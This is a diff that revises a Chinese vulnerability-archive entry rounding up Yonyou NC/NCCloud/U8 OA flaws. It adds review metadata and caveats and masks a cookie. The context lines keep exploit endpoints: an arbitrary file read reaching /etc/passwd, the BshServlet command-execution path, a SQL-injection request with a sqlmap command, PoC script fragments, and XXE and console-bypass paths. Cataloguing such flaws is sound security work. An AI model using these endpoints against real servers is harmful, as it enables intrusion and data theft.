@@ -1,12 +1,51 @@
 ---
-version: "/uapws/service"
-fofa: "/platform/yonyou-yyy.js"
 source: "MrWQ/vulnerability-paper"
+title: "用友NC/NCCloud/U8 OA 历史漏洞汇总"
+product: "用友NC/NCCloud/U8 OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2022-30190"
+identifier_status: "unknown"
+affected_scope: "部分NC6.5，多数无版本"
+prerequisites: "多实体不同条件"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/rEWSwg0I22Vw9g77x6kGWA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC%20%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB.md"
+fofa_unverified: "/platform/yonyou-yyy.js"
+id: "vw-26011830af535237dda7c39d"
+entity_id: "ve-26011830af535237dda7c39d"
+schema_version: "1"
 ---
 
-# 用友 NC 漏洞汇总
+# 用友NC/NCCloud/U8 OA 历史漏洞汇总
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友NC/NCCloud/U8 OA；历史漏洞汇总
+- 版本、配置及部署条件：部分NC6.5，多数无版本
+- 认证与权限前提：多实体不同条件
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 与146结构内容同源，新增certutil落文件并非新漏洞；本稿工具名失去外链
+- Python多余缩进、未定义filename、Xbrl URL语法损坏及固定序列化长度同问题
+- DNS迹象不能证RCE，客户端改0为1不证服务端认证绕过；XXE仅WSDL不足
+- version误取/uapws/service，尾FollinaCVE仅宣传；合并保留原Github更完整引用
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rEWSwg0I22Vw9g77x6kGWA)
 
  ![](http://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZq5sEo9xMfOVGAKuZWic3dSmVcRnYRDwbJdF39kiaGOrw5ofgicOs4WUH5PBiaq1MXpYDVbfSlCKJ00g/0?wx_fmt=png&wx_head=1) ** Z2O 安全攻防 ** From zero to one 25 篇原创内容  公众号
@@ -41,7 +80,7 @@ ncDecode--- 用友 nc 数据库密码解密
 0x02 配置文件
 ---------
 
-### 2.1 WEB.xml
+#### 2.1 WEB.xml
 
 ```
 /webapps/nc_web/WEB-INF/web.xml
@@ -81,7 +120,7 @@ ncDecode--- 用友 nc 数据库密码解密
 0x03 漏洞整理
 ---------
 
-### 3.1 任意文件读取
+#### 3.1 任意文件读取
 
 `filename`参数可以读取下列所有文件，在某些情况下可以读取利用目录穿越可读取 / etc/passwd 等文件
 
@@ -91,7 +130,7 @@ http://x.x.x.x/NCFindWeb?service=IPreAlertConfigService&filename=/
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0leeI2MaoURl1GP3KtRTO83kxofoIoMr1fH5KVmgQB89sfk1vXO1dvOeew/640?wx_fmt=png)
 
-### 3.2 `bsh.servlet.BshServlet` 远程命令执行漏洞
+#### 3.2 `bsh.servlet.BshServlet` 远程命令执行漏洞
 
 用友 `NC bsh.servlet.BshServlet` 存在远程命令执行漏洞，通过 `BeanShell` 执行远程命令获取服务器权限。
 
@@ -164,7 +203,7 @@ http://x.x.x.x/service/~aim/bsh.servlet.BshServlet
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0leevmpKwziaIf5yHOfDhF2BD2wF73zIk1uw7smsGPzQxNACsciawYN0yMfw/640?wx_fmt=png)
 
-### 3.3 用友 `NCCloud FS` 文件管理 `SQL` 注入
+#### 3.3 用友 `NCCloud FS` 文件管理 `SQL` 注入
 
 用友 `NCCloud FS` 文件管理登录页面对用户名参数没有过滤，存在 `SQL` 注入。
 
@@ -188,7 +227,7 @@ Fofa:
 
 username 参数存在注入，抓取登录数据包：  
 
-```
+```http
 GET /fs/console?username=1&password=00PGRLxSTe3VroI21qJNymCrZfPX1UQ4ij0gIWn2Gc4%3D HTTP/1.1
  Host: x.x.x.x
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
@@ -197,7 +236,7 @@ GET /fs/console?username=1&password=00PGRLxSTe3VroI21qJNymCrZfPX1UQ4ij0gIWn2Gc4%
  Accept-Encoding: gzip, deflate
  Connection: close
  Referer: http://x.x.x.x/fs/
- Cookie: JSESSIONID=FFAE8EF48BD3BEF7E94B5449B8F9BA90.server
+ Cookie: JSESSIONID=F*************************************r
  Upgrade-Insecure-Requests: 1
 ```
 
@@ -209,7 +248,7 @@ sqlmap -r text.txt -p username
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0leeQfxetgkkFZdF4ChaoBibz3KgPU1PzBiaN39ibTnc4JcK6MZguw3SF8qiaw/640?wx_fmt=png)
 
-### 3.4 用友 `NC 6.5` 未授权文件上传漏洞
+#### 3.4 用友 `NC 6.5` 未授权文件上传漏洞
 
 用友 `NC6.5` 版本存在未授权文件上传漏洞，攻击者可以未授权上传任意文件，进而获取服务端控制权限。
 
@@ -295,7 +334,7 @@ import requests
 
 用友 NC-OA 漏洞合集
 
-### 3.5 用友 `NC XbrlPersistenceServlet` 反序列化
+#### 3.5 用友 `NC XbrlPersistenceServlet` 反序列化
 
 已知用友 `NC6.5` 版本存在反序列化漏洞，攻击者可以执行系统命令，获取服务端权限。
 
@@ -321,7 +360,7 @@ import requests
  print (req.text)
 ```
 
-### 3.6 用友 `U8 OA``SQL`注入漏洞
+#### 3.6 用友 `U8 OA``SQL`注入漏洞
 
 用友 `U8 OA test.jsp` 文件存在 `SQL` 注入漏洞
 
@@ -343,7 +382,7 @@ POC:
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0leeS9sicfsbbWojxoXkWVde6c0LHPf1ySkqfdKvxP2cLibDQZ63X76zcUVA/640?wx_fmt=png)
 
-### 3.7 xxe 漏洞
+#### 3.7 xxe 漏洞
 
 接口处的 XXE 漏洞
 
@@ -353,9 +392,9 @@ POC:
 /uapws/service/nc.uap.oba.update.IUpdateService?wsdl
 ```
 
-### ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0lee9MkI1uNiccwdhzXs26nLqluHuAAibvvQiaNZ8TP1gErepetWibmJ2RxHZw/640?wx_fmt=png)
+#### ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0lee9MkI1uNiccwdhzXs26nLqluHuAAibvvQiaNZ8TP1gErepetWibmJ2RxHZw/640?wx_fmt=png)
 
-### 3.8 接口信息泄露
+#### 3.8 接口信息泄露
 
 在其中有个接口可以获取数据库账户密码，不过是老版本了
 
@@ -365,7 +404,7 @@ POC:
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYRKD1CKhhNVWGuqLwF0leegkNz0hHoVwcRrkR4pbbDpS2F3fjKP1E0VSQey1XxRLrdsR9kxbmpgw/640?wx_fmt=png)
 
-### 3.9 控制台密码绕过
+#### 3.9 控制台密码绕过
 
 ```
 /uapws/index.jsp
